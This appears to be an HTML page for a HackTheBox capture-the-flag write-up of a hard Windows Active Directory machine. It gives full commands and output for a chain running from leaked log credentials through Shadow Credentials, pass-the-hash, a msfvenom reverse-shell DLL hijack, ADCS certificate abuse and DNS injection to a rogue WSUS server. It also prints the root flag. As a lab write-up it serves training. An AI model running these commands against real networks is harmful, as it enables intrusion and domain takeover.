@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    .wr-hero { margin-bottom:36px; }
+    .wr-title { font-family:var(--mono); font-size:36px; font-weight:700; color:var(--text); margin-bottom:10px; }
+    .wr-title em { color:var(--green); font-style:normal; }
+    .wr-meta  { display:flex; gap:7px; flex-wrap:wrap; margin-bottom:18px; }
+    .wr-summary { font-size:15px; color:var(--muted); line-height:1.8; max-width:700px; border-left:2px solid var(--green); padding-left:16px; }
+    .flags { display:flex; gap:12px; margin:22px 0; flex-wrap:wrap; }
+    .flag-box { background:var(--bg3); border:1px solid var(--border); border-radius:8px; padding:14px 18px; flex:1; min-width:200px; }
+    .flag-lbl { font-family:var(--mono); font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.1em; margin-bottom:6px; }
+    .flag-val { font-family:var(--mono); font-size:13px; color:var(--green); word-break:break-all; }
+    .wr-section { margin-bottom:44px; scroll-margin-top:70px; }
+    .wr-sec-hdr { display:flex; align-items:center; gap:12px; margin-bottom:20px; padding-bottom:10px; border-bottom:1px solid var(--border); }
+    .step-num { font-family:var(--mono); font-size:11px; color:var(--green); background:var(--gglow); border:1px solid rgba(57,211,83,.25); padding:2px 10px; border-radius:4px; }
+    .step-title { font-family:var(--mono); font-size:18px; font-weight:500; color:var(--text); }
+    .prose { font-size:15px; line-height:1.85; color:#a0aab4; margin-bottom:14px; }
+    .prose strong { color:var(--text); font-weight:500; }
+    .prose code { font-family:var(--mono); font-size:12px; background:var(--surface2); color:var(--orange); padding:2px 6px; border-radius:3px; }
+    .toc-extra { padding:14px 10px 10px; border-top:1px solid var(--border); }
+    .toc-lbl { font-family:var(--mono); font-size:10px; color:var(--muted); letter-spacing:.12em; text-transform:uppercase; padding:0 8px; margin-bottom:6px; }
+    .toc-item { display:flex; align-items:center; gap:8px; padding:6px 10px; border-radius:5px; font-family:var(--mono); font-size:11px; color:var(--muted); text-decoration:none; transition:all .15s; border:1px solid transparent; }
+    .toc-item:hover { background:var(--surface); color:var(--text); }
+    .toc-item.active { color:var(--green); background:var(--gglow); border-color:rgba(57,211,83,.2); }
+    .toc-num { color:var(--gdim); font-size:10px; width:14px; flex-shrink:0; }
+    .mc-info { margin:10px; background:var(--bg3); border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+    .mc-info-row { display:flex; justify-content:space-between; font-family:var(--mono); font-size:11px; padding:7px 14px; border-bottom:1px solid var(--border); }
+    .mc-info-row:last-child { border-bottom:none; }
+    .mc-info-k { color:var(--muted); } .mc-info-v { color:var(--text); }
+  </style>
+</head>
+<body>
+<div class="page-content">
+
+  <!-- ── HERO ── -->
+  <div class="wr-hero">
+    <div class="wr-title">Logging<em>.</em></div>
+    <div class="wr-meta">
+      <span class="tag tag-orange">Hard</span>
+      <span class="tag tag-orange">Windows</span>
+      <span class="tag tag-blue">Active Directory</span>
+      <span class="tag tag-blue">ADCS</span>
+      <span class="tag tag-muted">HTB</span>
+    </div>
+    <div class="wr-summary">
+      A hard Windows Active Directory machine where credentials leaked in a readable log file kick off a chain through gMSA abuse, Shadow Credentials, DLL hijacking via a scheduled task, ADCS certificate enrollment, and a rogue WSUS server to achieve SYSTEM-level code execution.
+    </div>
+  </div>
+
+  <!-- ── FLAGS ── -->
+  <div class="flags">
+    <div class="flag-box">
+      <div class="flag-lbl">User Flag</div>
+      <div class="flag-val">35e4190159d2d74a82████████████████</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-lbl">Root Flag</div>
+      <div class="flag-val">a98dee732515f710d6c1████████████████</div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 01 — RECON
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="recon">
+    <div class="wr-sec-hdr">
+      <span class="step-num">01</span>
+      <span class="step-title">Reconnaissance</span>
+    </div>
+
+    <p class="prose">Standard nmap scan reveals a Windows Domain Controller exposing the usual AD services: DNS, Kerberos, LDAP, SMB, and WinRM. The hostname <code>DC01.logging.htb</code> and domain <code>logging.htb</code> are confirmed from the SMB banner.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">nmap</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">nmap</span> <span class="tf">-sC -sV -oN</span> <span class="ta">scan.txt</span> <span class="tt">10.129.x.x</span>
+
+<span class="thl">53/tcp   open  domain        Simple DNS Plus</span>
+<span class="thl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos</span>
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+<span class="thl">389/tcp  open  ldap           Microsoft Windows Active Directory LDAP</span>
+<span class="thl">445/tcp  open  microsoft-ds</span>
+<span class="thl">5985/tcp open  http           Microsoft HTTPAPI httpd 2.0 (WinRM)</span>
+      </div>
+    </div>
+
+    <div class="callout c-find">
+      <strong>finding:</strong> Standard DC port layout. WinRM open means any valid domain credentials can yield a shell. SMB anonymous access grants read on a <code>Logs</code> share.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 02 — ENUMERATION & CREDENTIAL LEAK
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="enum">
+    <div class="wr-sec-hdr">
+      <span class="step-num">02</span>
+      <span class="step-title">Enumeration — Credential Leak in Log Files</span>
+    </div>
+
+    <p class="prose">Anonymous SMB enumeration reveals a readable <code>Logs</code> share. Pulling <code>IdentitySync_Trace_20260219.log</code> exposes a verbose debug dump of a failed LDAP bind — including plaintext credentials for <code>svc_recovery</code>.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">smbclient</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">smbclient</span> <span class="tt">//10.129.x.x/Logs</span> <span class="tf">-N</span>
+smb: \> <span class="tc">get</span> IdentitySync_Trace_20260219.log
+
+<span class="tp">$</span> <span class="tc">grep</span> <span class="tf">-i</span> <span class="ta">"bindpass\|password\|cred"</span> IdentitySync_Trace_20260219.log
+<span class="thl">VERBOSE - ConnectionContext Dump: { BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025" }</span>
+      </div>
+    </div>
+
+    <p class="prose">The password had been rotated — the log shows a failed bind with the old password. The current password <code>Em3rg3ncyPa$$2026</code> was discovered by trying the year-incremented variant, which authenticated successfully via CrackMapExec. The account has <code>STATUS_ACCOUNT_RESTRICTION</code> on NTLM — Kerberos only.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">getTGT</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">faketime</span> <span class="tf">-f "+7h"</span> impacket-getTGT logging.htb/svc_recovery:<span class="ta">'Em3rg3ncyPa$$2026'</span> <span class="tf">-dc-ip</span> 10.129.x.x
+<span class="thl">[*] Saving ticket in svc_recovery.ccache</span>
+      </div>
+    </div>
+
+    <div class="callout c-warn">
+      <strong>clock skew:</strong> The DC has a ~7-hour offset. All Kerberos operations require <code>faketime -f "+7h"</code> as a prefix, or absolute timestamps for reliability.
+    </div>
+
+    <p class="prose">BloodHound enumeration with <code>svc_recovery</code> reveals the account is a member of <strong>Emergency Recovery</strong> and has <strong>GenericWrite</strong> on the gMSA <code>msa_health$</code>.</p>
+
+    <div class="callout c-find">
+      <strong>finding:</strong> <code>svc_recovery</code> → GenericWrite → <code>msa_health$</code> (gMSA). GenericWrite on a gMSA allows writing <code>msDS-KeyCredentialLink</code>, enabling Shadow Credentials.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 03 — SHADOW CREDENTIALS → gMSA HASH
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="shadowcreds">
+    <div class="wr-sec-hdr">
+      <span class="step-num">03</span>
+      <span class="step-title">Shadow Credentials → msa_health$ NT Hash</span>
+    </div>
+
+    <p class="prose">With GenericWrite on <code>msa_health$</code>, we can write to <code>msDS-KeyCredentialLink</code> and perform a Shadow Credentials attack — adding a certificate that allows PKINIT authentication without knowing the account's password.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">pywhisker</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">KRB5CCNAME</span>=svc_recovery.ccache <span class="tc">faketime</span> <span class="tf">-f "+7h"</span> \
+  python3 pywhisker.py <span class="tf">-d</span> logging.htb <span class="tf">-u</span> SVC_recovery <span class="tf">-k</span> \
+  <span class="tf">--target</span> <span class="ta">'msa_health$'</span> <span class="tf">--action</span> add <span class="tf">--filename</span> msa_shadow
+
+<span class="thl">[+] Updated the msDS-KeyCredentialLink attribute of the target object</span>
+[*] Must be used with password: E9ro5LVbhkd1yV3w2Wt0
+[*] Saved PFX to: msa_shadow.pfx
+      </div>
+    </div>
+
+    <p class="prose">Use PKINITtools to request a TGT for <code>msa_health$</code> via the certificate, then extract the NT hash via U2U (User-to-User Kerberos).</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">PKINITtools</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">faketime</span> <span class="tf">-f "+7h"</span> python3 gettgtpkinit.py \
+  <span class="tf">-cert-pfx</span> msa_shadow.pfx <span class="tf">-pfx-pass</span> <span class="ta">'E9ro5LVbhkd1yV3w2Wt0'</span> \
+  logging.htb/<span class="ta">'msa_health$'</span> msa_health.ccache
+
+[*] AS-REP encryption key: <span class="thl">937f6683e38e0c434a22492f7f5b2be919c5ca45bf49cab642e05024252af4db</span>
+
+<span class="tp">$</span> <span class="tc">KRB5CCNAME</span>=msa_health.ccache <span class="tc">faketime</span> <span class="tf">-f "+7h"</span> \
+  python3 getnthash.py logging.htb/<span class="ta">'msa_health$'</span> \
+  <span class="tf">-key</span> 937f6683e38e0c434a22492f7f5b2be919c5ca45bf49cab642e05024252af4db
+
+<span class="thl">[*] Got hash for 'msa_health$': aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5</span>
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">evil-winrm</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">evil-winrm</span> <span class="tf">-i</span> dc01.logging.htb <span class="tf">-u</span> <span class="ta">'msa_health$'</span> <span class="tf">-H</span> 603fc24ee01a9409f83c9d1d701485c5
+<span class="thl">*Evil-WinRM* PS C:\Users\msa_health$\Documents></span>
+      </div>
+    </div>
+
+    <div class="callout c-find">
+      <strong>finding:</strong> Shell as <code>msa_health$</code>. The account has <code>SeMachineAccountPrivilege</code> and is a member of <code>BUILTIN\Remote Management Users</code> and <code>BUILTIN\Certificate Service DCOM Access</code>.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 04 — DLL HIJACK → jaylee.clifton
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="dlhijack">
+    <div class="wr-sec-hdr">
+      <span class="step-num">04</span>
+      <span class="step-title">DLL Hijack via Scheduled Task → jaylee.clifton</span>
+    </div>
+
+    <p class="prose">Enumeration of <code>msa_health$</code>'s home directory reveals <code>monitor.ps1</code> — a script that monitors the <strong>UpdateChecker Agent</strong> scheduled task. Reading the task XML shows it runs as <code>jaylee.clifton</code> every 3 minutes and executes <code>UpdateMonitor.exe</code>.</p>
+
+    <p class="prose">Decompiling <code>UpdateMonitor.exe</code> with <code>ilspycmd</code> reveals the exact attack path: the binary checks for <code>C:\ProgramData\UpdateMonitor\Settings_Update.zip</code>. If found, it extracts the contents into <code>C:\Program Files\UpdateMonitor\bin\</code> and loads <code>settings_update.dll</code> via <code>LoadLibrary</code>.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">decompile + exploit</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tcm"># Key logic from UpdateMonitor.exe (decompiled)</span>
+if (File.Exists(<span class="ta">"C:\ProgramData\UpdateMonitor\Settings_Update.zip"</span>)) {
+    File.Delete(text4);                    <span class="tcm">// delete old DLL</span>
+    ZipFile.ExtractToDirectory(text, text2); <span class="tcm">// extract zip to bin\</span>
+}
+LoadLibrary(<span class="ta">"C:\Program Files\UpdateMonitor\bin\settings_update.dll"</span>);
+
+<span class="tcm"># msa_health$ can write to C:\ProgramData\UpdateMonitor\ (BUILTIN\Users WD)</span>
+<span class="tcm"># jaylee (IT group) has full control on bin\ — task extracts as jaylee</span><br>
+
+<span class="tp">$</span> <span class="tc">msfvenom</span> <span class="tf">-p</span> windows/shell_reverse_tcp <span class="tf">LHOST</span>=10.10.15.15 <span class="tf">LPORT</span>=4444 \
+  <span class="tf">-f</span> dll <span class="tf">-o</span> settings_update.dll <br>
+<span class="tp">$</span> <span class="tc">zip</span> Settings_Update.zip settings_update.dll
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">evil-winrm upload + catch</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tcm"># Upload zip via msa_health$ session</span><br>
+*Evil-WinRM* PS> <span class="tc">upload</span> Settings_Update.zip <span class="ta">"C:\ProgramData\UpdateMonitor\Settings_Update.zip"</span>
+
+<span class="tcm"># Wait up to 3 minutes for the task to fire...</span> <br>
+<span class="tp">$</span> <span class="tc">nc</span> <span class="tf">-lvnp</span> 4444
+<span class="thl">C:\Windows\system32> whoami</span>
+<span class="thl">logging\jaylee.clifton</span>
+      </div>
+    </div>
+
+    <div class="callout c-warn">
+      <strong>gotcha:</strong> The 32-bit DLL payload cannot find 64-bit system binaries like <code>UsoClient.exe</code> due to WOW64 filesystem redirection. Use <code>C:\Windows\Sysnative\cmd.exe</code> to get a 64-bit shell when needed.
+    </div>
+
+    <p class="prose"><code>jaylee.clifton</code> is a member of the <strong>IT</strong> group, which has full control (<code>F</code>) on <code>C:\Program Files\UpdateMonitor\bin\</code>. The user flag is on <code>jaylee</code>'s Desktop.</p>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 05 — ADCS ESC1 → WSUS CERT
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="adcs">
+    <div class="wr-sec-hdr">
+      <span class="step-num">05</span>
+      <span class="step-title">ADCS Certificate — Minting a Trusted WSUS Cert</span>
+    </div>
+
+    <p class="prose">Certipy enumeration reveals a custom template <strong>UpdateSrv</strong> with <code>EnrolleeSuppliesSubject: True</code> and enrollment rights granted to <code>LOGGING\IT</code>. The EKU is <strong>Server Authentication</strong> only — not Client Authentication — so it cannot be used for Kerberos PKINIT. However, it is exactly what a WSUS HTTPS server needs.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">certipy</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tcm"># Dump jaylee's TGT from reverse shell</span> <br>
+C:\> <span class="tc">Rubeus.exe</span> tgtdeleg /nowrap <br>
+<span class="tp">$</span> <span class="tc">impacket-ticketConverter</span> jaylee.kirbi jaylee.clifton.ccache
+
+<span class="tcm"># Request certificate with wsus.logging.htb as SAN</span> <br>
+<span class="tp">$</span> <span class="tc">KRB5CCNAME</span>=jaylee.clifton.ccache <span class="tc">faketime</span> <span class="tf">-f "+7h"</span> \
+  certipy req <span class="tf">-u</span> <span class="ta">'jaylee.clifton@logging.htb'</span> <span class="tf">-k -no-pass</span> \
+  <span class="tf">-target</span> dc01.logging.htb <span class="tf">-dc-ip</span> 10.129.x.x \
+  <span class="tf">-ca</span> <span class="ta">'logging-DC01-CA'</span> <span class="tf">-template</span> <span class="ta">'UpdateSrv'</span> \
+  <span class="tf">-dns</span> <span class="ta">'wsus.logging.htb'</span> <br>
+
+<span class="thl">[*] Got certificate with DNS Host Name 'wsus.logging.htb'</span>
+[*] Saved certificate and private key to 'wsus.pfx'
+      </div>
+    </div>
+
+    <p class="prose">We now hold a certificate for <code>wsus.logging.htb</code> signed by <code>logging-DC01-CA</code> — the internal CA that DC01 trusts for all TLS verification, including WSUS update traffic.</p>
+
+    <div class="callout c-find">
+      <strong>finding:</strong> The DC is configured to fetch Windows Updates from <code>https://wsus.logging.htb:8531</code> (confirmed via registry key <code>HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\WUServer</code>). The hostname does not exist in DNS yet.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 06 — DNS POISONING + ROGUE WSUS
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="wsus">
+    <div class="wr-sec-hdr">
+      <span class="step-num">06</span>
+      <span class="step-title">DNS Record Injection + Rogue WSUS Server → SYSTEM</span>
+    </div>
+
+    <p class="prose"><code>svc_recovery</code> has <code>CREATE_CHILD</code> on the AD-integrated DNS zone. We add an A record for <code>wsus</code> pointing to our Kali machine — no ARP spoofing needed, pure AD-level DNS injection.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">dnstool</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">KRB5CCNAME</span>=svc_recovery.ccache <span class="tc">faketime</span> <span class="tf">-f "+7h"</span> \
+  python3 krbrelayx/dnstool.py \
+  <span class="tf">-u</span> <span class="ta">'logging.htb\svc_recovery'</span> <span class="tf">-k</span> \
+  <span class="tf">-r</span> wsus <span class="tf">-a</span> add <span class="tf">-d</span> 10.10.15.15 \
+  <span class="tf">-dns-ip</span> 10.129.x.x dc01.logging.htb
+
+<span class="thl">[+] LDAP operation completed successfully</span>
+      </div>
+    </div>
+
+    <p class="prose">With DNS in place and our trusted certificate ready, we stand up a rogue WSUS server using <strong>wsuks</strong>. Unlike pywsus, wsuks uses a minimal <code>sync-updates.xml</code> without Windows product category prerequisites — meaning the DC's update agent follows through to <code>GetExtendedUpdateInfo</code> and downloads the payload.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">Wsuks_payload.py</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tcm"># Prepare certs and payload</span><br>
+<span class="tp">$</span> <span class="tc">openssl</span> pkcs12 <span class="tf">-in</span> wsus.pfx <span class="tf">-out</span> /tmp/wsus_cert.pem <span class="tf">-clcerts -nokeys -passin</span> pass:<br>
+<span class="tp">$</span> <span class="tc">openssl</span> pkcs12 <span class="tf">-in</span> wsus.pfx <span class="tf">-out</span> /tmp/wsus_key.pem <span class="tf">-nocerts -nodes -passin</span> pass:<br>
+<span class="tp">$</span> <span class="tc">wget</span> https://live.sysinternals.com/tools/PsExec64.exe <span class="tf">-O</span> /tmp/PsExec64.exe
+
+<span class="tcm"># Wsuks_payload.py — stub ARP module, serve HTTPS WSUS on 8531</span><br>
+<span class="tp">$</span> <span class="tc">python3</span> Wsuks_payload.py
+[*] HTTP content on 10.10.15.15:8530
+[*] HTTPS WSUS on 10.10.15.15:8531
+      </div>
+    </div>
+
+    <p class="prose">Trigger the Windows Update scan from the <code>msa_health$</code> WinRM session (64-bit context), which causes DC01 to contact our rogue WSUS server.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">trigger + WSUS handshake</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+*Evil-WinRM* PS> <span class="tc">C:\Windows\System32\UsoClient.exe</span> StartScan
+
+<span class="tcm"># wsuks terminal catches the full handshake:</span>
+<span class="thl">[+] POST /ClientWebService/client.asmx — GetConfig</span>
+<span class="thl">[+] POST /ClientWebService/client.asmx — GetCookie</span>
+<span class="thl">[+] POST /ClientWebService/client.asmx — SyncUpdates</span>
+<span class="thl">[+] POST /ClientWebService/client.asmx — GetExtendedUpdateInfo</span>
+<span class="thl">[+] GET  /&lt;uuid&gt;/PsExec64.exe</span>
+<span class="thl">[+] GET  /&lt;uuid&gt;/PsExec64.exe</span>
+      </div>
+    </div>
+
+    <p class="prose">PsExec64 is executed as <strong>SYSTEM</strong> by the Windows Update agent with the command we specified: <code>/accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add"</code>. Re-authenticating via WinRM picks up the new token with local admin rights.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="term-label">root</span>
+        <button class="copy-btn" onclick="copyTerm(this)">copy</button>
+      </div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">evil-winrm</span> <span class="tf">-i</span> dc01.logging.htb <span class="tf">-u</span> <span class="ta">'msa_health$'</span> <span class="tf">-H</span> 603fc24ee01a9409f83c9d1d701485c5 <br>
+*Evil-WinRM* PS> <span class="tc">whoami /groups</span> | findstr <span class="tf">/i</span> admin
+<span class="thl">BUILTIN\Administrators   Mandatory group, Enabled by default, Enabled group, Group owner</span>
+
+*Evil-WinRM* PS> <span class="tc">type C:\Users\toby.brynleigh\Desktop\root.txt </span>
+<span class="thl">a98dee732515f710d6c14474cac28cd9</span>
+      </div>
+    </div>
+
+    <div class="callout c-warn">
+      <strong>note:</strong> The root flag is on <code>toby.brynleigh</code>'s Desktop, not Administrator's. <code>toby.brynleigh</code> is a Domain Admin whose Desktop is readable once <code>msa_health$</code> has local admin rights.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════
+       STEP 07 — SUMMARY
+  ═══════════════════════════════════ -->
+  <div class="wr-section" id="summary">
+    <div class="wr-sec-hdr">
+      <span class="step-num">07</span>
+      <span class="step-title">Summary</span>
+    </div>
+
+    <div class="callout c-info">
+      <strong>attack chain:</strong><br><br>
+      SMB anonymous read → plaintext creds in <code>IdentitySync_Trace</code> log (<code>svc_recovery</code>)
+      → GenericWrite on <code>msa_health$</code> → Shadow Credentials (pywhisker + PKINITtools) → NT hash
+      → Evil-WinRM as <code>msa_health$</code>
+      → Decompile <code>UpdateMonitor.exe</code> → zip-based DLL hijack via <code>C:\ProgramData\UpdateMonitor\</code>
+      → Reverse shell as <code>jaylee.clifton</code> (IT group)
+      → Enroll <code>UpdateSrv</code> ADCS template with <code>wsus.logging.htb</code> SAN
+      → Inject DNS A record via <code>svc_recovery</code> (CREATE_CHILD on DNS zone)
+      → Rogue WSUS server (wsuks + stunnel TLS) serving malicious PsExec64 update
+      → <code>UsoClient StartScan</code> triggers DC to download and execute payload as SYSTEM
+      → <code>msa_health$</code> added to local Administrators
+      → <code>root.txt</code> from <code>toby.brynleigh\Desktop</code>
+    </div>
+
+    <p class="prose" style="margin-top:20px;">
+      <strong>Key takeaways:</strong>
+    </p>
+    <p class="prose">
+      <strong>Log hygiene is a credential store.</strong> The <code>IdentitySync_Trace</code> log contained a plaintext LDAP bind password in a verbose debug dump — readable over anonymous SMB. This single leak was the root of the entire chain.
+    </p>
+    <p class="prose">
+      <strong>GenericWrite on a gMSA equals its password.</strong> Shadow Credentials abuse via <code>msDS-KeyCredentialLink</code> lets any principal with GenericWrite authenticate as the gMSA without ever needing to read <code>msDS-ManagedPassword</code>.
+    </p>
+    <p class="prose">
+      <strong>Scheduled task input directories are impersonation primitives.</strong> A zip drop into a writable directory that a privileged task unpacks is functionally equivalent to writing to that task's execution context. The key was identifying the writable path (<code>C:\ProgramData\UpdateMonitor\</code>) vs. the privileged extraction target (<code>bin\</code>).
+    </p>
+    <p class="prose">
+      <strong>Server Authentication EKU ≠ PKINIT, but it does equal WSUS trust.</strong> The <code>UpdateSrv</code> template was not exploitable via standard ESC1 Kerberos paths, but it was exactly the primitive needed to impersonate the WSUS HTTPS endpoint the DC trusts.
+    </p>
+    <p class="prose">
+      <strong>pywsus fails silently on Server 2019 DCs.</strong> pywsus advertises updates under product categories the server OS isn't enrolled in. The client logs "0 updates detected" and never calls <code>GetExtendedUpdateInfo</code>. wsuks uses a simpler sync XML that the DC follows through.
+    </p>
+    <p class="prose">
+      <strong>DNS CREATE_CHILD rights + no ARP needed.</strong> <code>Authenticated Users</code> can create DNS nodes in AD-integrated zones by default. A machine account (or any authenticated user with the right) can point any hostname at attacker infrastructure purely through LDAP — no layer-2 access required.
+    </p>
+  </div>
+
+  <!-- bottom nav -->
+  <div style="display:flex;justify-content:space-between;margin-top:24px;font-family:var(--mono);font-size:12px;">
+    <a href="index.html" style="color:var(--muted);text-decoration:none;">← all writeups</a>
+    <a href="#" style="color:var(--green);text-decoration:none;">next machine →</a>
+  </div>
+
+</div><!-- /page-content -->
+
+<script>
+  initPage({
+    title: 'Logging — Writeup',
+    breadcrumb: 'writeups/logging',
+    tags: [
+      { label: 'Hard',            color: 'orange' },
+      { label: 'Windows',         color: 'orange' },
+      { label: 'Active Directory', color: 'blue'  },
+      { label: 'ADCS',            color: 'blue'   },
+      { label: 'HTB',             color: 'muted'  },
+    ],
+    extraSb: `
+      <div class="mc-info">
+        <div class="mc-info-row"><span class="mc-info-k">machine</span><span class="mc-info-v">Logging</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">os</span><span class="mc-info-v">Windows Server 2019</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">difficulty</span><span class="mc-info-v" style="color:var(--orange)">Hard</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">platform</span><span class="mc-info-v">HackTheBox</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">user</span><span class="mc-info-v" style="color:var(--green)">✓</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">root</span><span class="mc-info-v" style="color:var(--green)">✓</span></div>
+      </div>
+      <div class="toc-extra">
+        <div class="toc-lbl">contents</div>
+        <a href="#recon"       class="toc-item active"><span class="toc-num">01</span>Recon</a>
+        <a href="#enum"        class="toc-item"><span class="toc-num">02</span>Cred Leak</a>
+        <a href="#shadowcreds" class="toc-item"><span class="toc-num">03</span>Shadow Creds</a>
+        <a href="#dlhijack"    class="toc-item"><span class="toc-num">04</span>DLL Hijack</a>
+        <a href="#adcs"        class="toc-item"><span class="toc-num">05</span>ADCS Cert</a>
+        <a href="#wsus"        class="toc-item"><span class="toc-num">06</span>Rogue WSUS</a>
+        <a href="#summary"     class="toc-item"><span class="toc-num">07</span>Summary</a>
+      </div>`,
+  });
+
+  const tocLinks = document.querySelectorAll('.toc-item');
+  const sections = document.querySelectorAll('.wr-section');
+  window.addEventListener('scroll', () => {
+    let cur = '';
+    sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) cur = s.id; });
+    tocLinks.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + cur));
+  });
+</script>
+</body>
+</html>
